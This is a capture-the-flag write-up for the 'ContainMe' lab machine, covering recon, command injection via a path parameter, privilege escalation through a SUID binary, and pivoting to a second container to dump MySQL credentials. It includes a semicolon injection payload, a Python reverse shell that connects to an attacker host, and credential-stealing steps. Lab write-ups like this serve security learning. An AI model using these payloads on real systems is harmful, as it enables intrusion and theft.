# ContainMe
Where am I ? Catch me

## Recon
`nmap -A -T4 10.49.154.181`

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f9:a9:c0:5d:75:cd:9f:12:c7:12:42:f9:81:82:4c:6a (RSA)
|   256 fd:b5:62:df:73:42:09:e2:ff:99:30:64:45:b5:cd:27 (ECDSA)
|_  256 4e:10:c0:95:75:a4:c0:8c:a8:11:99:5d:f1:90:a9:4d (ED25519)
```

- Default Apache2 page on http 80/tcp. 

## Enumeration
- Directory enumeration: `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.49.154.181`

```
index.html           (Status: 200) [Size: 10918]
index.php            (Status: 200) [Size: 329]
info.php             (Status: 200) [Size: 68951]
```

- `http://10.49.154.181/index.php` displays files from within the `/var/www/html` directory and when `?path=<path>` is appended, this allows further enumeration of files and directories on the server, i.e. user enum with `/home`
- Source code divulges a comment as a hint: `<!--  where is the path ?  -->`
- Enumerated one user: `mike`

- `http://10.49.154.181/index.php?path=/home/mike` lists one file: 

```
-rwxr-xr-x 1 mike mike 351K Jul 30  2021 1cryptupx
```

## Initial Access
- Attacker can use the semicolon to break out of the intended path parameter and issue commands to the server, resulting in remote command execution (RCE), i.e. `?path=; cat /etc/passwd`
- This can be exploited to obtain a reverse shell connection from the victim to the attacker machine: `?path=; python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker-ip>",<attacker-port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`

- Executing `./1cryptupx` on mike's home directory prints out an ASCII text banner displaying "Cryptshell" and appending the `-h` parameter to check for any help information returns "You wish!`
- Enumerating SUID binaries with `find / -perm -4000 -type f 2>/dev/null/` returns a non-standard binary: `/usr/share/man/zh_TW/crypt`, which seems to be the same program as the `1cryptupx` file on mike's home directory. 

## Privilege Escalation and Pivoting
- Executing `./1cryptupx mike` results in root access for the current container. Details from `ipconfig` verifies this, as there is another private IP address on the network on the `172.16.20.0/24` network.  

- Reading and copying mike's SSH private key for SSH access on the current target address does not work: `cat id_rsa`, copy id_rsa output to an id_rsa file and change permissions with `chmod 600 id_rsa`  
- Nmap can be copied to the machine by retrieving the nmap binary on github and transferring it from the attacker machine to the victim: `wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap`

- Nmap results shows the second machine's private IP address and its services, running ssh on 172.16.20.6

- SSH access can be obtained with `ssh -i id_rsa mike@172.16.20.6`

- Perform user and service enumeration with `cat /etc/passwd`. This reveals a mysql service running on the machine, which can be accessed with `mysql -u mike` and the password `password`

- Read the contents of the database: 

```
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+

use accounts; 

show tables; 
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+

select * FROM users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | <root password>     |
| mike  | <mike password>     | 
+-------+---------------------+
```

- Switch to the root user: `su root` and enter in the password. 
- Change to the root directory and list all its contents: `cd /root && ls -la`
- The root directory contains `mike.zip` which can be unzipped with `unzip mike.zip` and inputting mike's password thereafter.
- A file called `mike` is extracted. 

- Flag captured.
